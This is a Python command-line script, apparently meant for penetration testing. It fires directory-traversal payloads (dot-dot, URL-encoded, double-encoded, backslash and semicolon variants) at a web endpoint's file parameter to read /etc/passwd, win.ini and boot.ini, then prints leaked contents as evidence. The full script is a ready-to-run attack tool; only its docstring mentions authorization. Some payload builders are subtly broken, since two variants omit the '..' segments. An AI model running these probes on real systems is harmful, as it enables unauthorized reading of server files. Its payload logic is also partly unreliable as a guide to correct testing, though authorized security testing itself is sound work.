#!/usr/bin/env python3
"""Probe file-path parameters for directory traversal on authorized targets."""

import argparse
import re
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "security-assessment-scripts/1.0"

TARGET_FILES = [
  ("linux passwd", "/etc/passwd", r"root:[x*!]:0:0:", "/"),
  ("windows win.ini", "windows/win.ini", r"\[fonts\]|\[extensions\]", "\\"),
  ("windows boot.ini", "boot.ini", r"\[boot loader\]", "\\"),
]


def build_payloads(target_file, separator, max_depth):
  payloads = []
  for depth in range(2, max_depth + 1):
    normal = separator * depth + target_file.lstrip("/")
    encoded = ("%2f" * depth) + target_file.lstrip("/")
    mixed = ("%2e%2e/" * depth) + target_file.lstrip("/")
    double = ("..%252f" * depth) + target_file.lstrip("/")
    broken = ("....//" * depth) + target_file.lstrip("/")
    backslash = ("..\\" * depth) + target_file.replace("/", "\\")
    semi = ("..;/" * depth) + target_file.lstrip("/")
    payloads.extend([normal, encoded, mixed, double, broken, backslash, semi])
  return payloads


def fetch(url, timeout):
  request = urllib.request.Request(url, headers={"User-Agent": UA})
  try:
    response = urllib.request.urlopen(request, timeout=timeout)
    return getattr(response, "status", response.code), response.read(65536)
  except urllib.error.HTTPError as exc:
    return exc.code, exc.read(65536)
  except (urllib.error.URLError, OSError):
    return None, b""


def main():
  parser = argparse.ArgumentParser(description="Test file parameters for path traversal against an authorized target.")
  parser.add_argument("url", help="endpoint with a file parameter, e.g. https://lab.example/download?f=IGNORED")
  parser.add_argument("--param", default="file", help="parameter name holding the file path")
  parser.add_argument("--max-depth", type=int, default=4, help="maximum traversal depth to test")
  parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout")
  parser.add_argument("--delay", type=float, default=0.1, help="delay between requests in seconds")
  args = parser.parse_args()

  separator = "&" if "?" in args.url else "?"
  baseline_status, baseline_body = fetch(args.url, args.timeout)
  print(f"[*] baseline: HTTP {baseline_status}, {len(baseline_body)} bytes\n")

  hits = []
  total = 0
  for label, target_file, signature, sep in TARGET_FILES:
    confirmed_for_target = False
    for payload in build_payloads(target_file, sep, args.max_depth):
      if confirmed_for_target:
        break
      probe_url = f"{args.url}{separator}{args.param}={urllib.parse.quote(payload, safe='')}"
      status, body = fetch(probe_url, args.timeout)
      total += 1
      decoded_body = body.decode("utf-8", "replace")
      if status == 200 and re.search(signature, decoded_body):
        print(f"[!] TRAVERSAL ({label}): payload={payload}")
        print(f"      {probe_url[:140]}")
        snippet = decoded_body[:200].replace("\n", " | ")
        print(f"      evidence: {snippet}")
        hits.append((label, payload))
        confirmed_for_target = True
      time.sleep(args.delay)

  print(f"\n{len(hits)} confirmed traversal(s) across {total} request(s).")
  if not hits:
    print("No traversal signatures matched; review responses for partial reads or error-based leaks.")


if __name__ == "__main__":
  main()
